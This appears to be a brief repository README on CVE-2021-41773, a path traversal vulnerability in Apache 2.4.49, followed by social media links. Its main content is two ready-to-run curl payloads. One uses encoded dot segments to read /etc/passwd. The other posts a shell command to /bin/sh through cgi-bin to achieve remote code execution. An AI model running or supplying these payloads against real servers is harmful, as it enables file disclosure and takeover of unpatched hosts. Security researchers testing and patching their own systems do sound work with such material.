# cve-2021-41773
CVE-2021-41773 Path Traversal vulnerability in Apache 2.4.49.


### RCE POC

[PoC](https://twitter.com/RapidSafeguard/status/1445730458487033861)

### Payload
##### curl -s --path-as-is "<IP>:[PORT]/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
##### curl -s --path-as-is --data "echo;Command" "[IP]:[PORT]/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh


#### Follow us 
#### [Vulnmachines](https://www.twitter.com/vulnmachines)
#### [YouTube](https://www.youtube.com/c/vulnmachines)
#### [Twitter](https://www.twitter.com/vulnmachines)
#### [Facebook](https://www.facebook.com/vulnmachines)
#### [LinkedIn](https://www.linkedin.com/company/vulnmachines)



